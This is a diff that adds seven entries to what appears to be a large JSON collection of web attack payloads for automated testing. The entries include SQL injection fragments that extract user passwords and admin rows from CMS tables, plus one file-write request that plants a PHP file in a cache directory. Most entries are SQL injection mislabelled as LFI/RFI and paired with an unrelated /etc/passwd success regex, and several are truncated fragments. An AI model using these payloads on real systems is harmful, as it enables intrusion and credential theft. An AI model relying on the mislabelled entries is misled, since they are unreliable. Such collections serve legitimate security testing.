@@ -328194,5 +328194,82 @@
       "expected_status_code": 200,
       "success_regex": "root:|boot\\.ini|\\[extensions\\]"
     }
+  },
+  {
+    "payload_id": "OWP-474656",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ") OR tagente_modulo.id_agente IN ( SELECT id_agente FROM tagente WHERE id_grupo IN ( 13 ) ) OR 0 IN ( SELECT id_grupo FROM tusuario_perfil WHERE id_usuario =",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474666",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "mirrorfile.php?filename=cache/seculab.php&action=writetofile&content=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474670",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "WHERE SUBSTR((SELECT $field FROM ${prfix}_user WHERE userID=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474671",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "(SELECT userID FROM ${prfix}_user_groups WHERE files=1 LIMIT 1)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474677",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\\nInserting a row in ${prfix}_nsnst_tracked_ips",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474678",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "OR SUBSTR((SELECT user_password FROM ${prfix}_users WHERE username=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
+  },
+  {
+    "payload_id": "OWP-474684",
+    "vulnerability_category": "Injection (LFI/RFI)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "(SELECT $field FROM ${tblprfix}_authors WHERE radminsuper=1)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|boot\\.ini|\\[extensions\\]"
+    }
   }
 ]
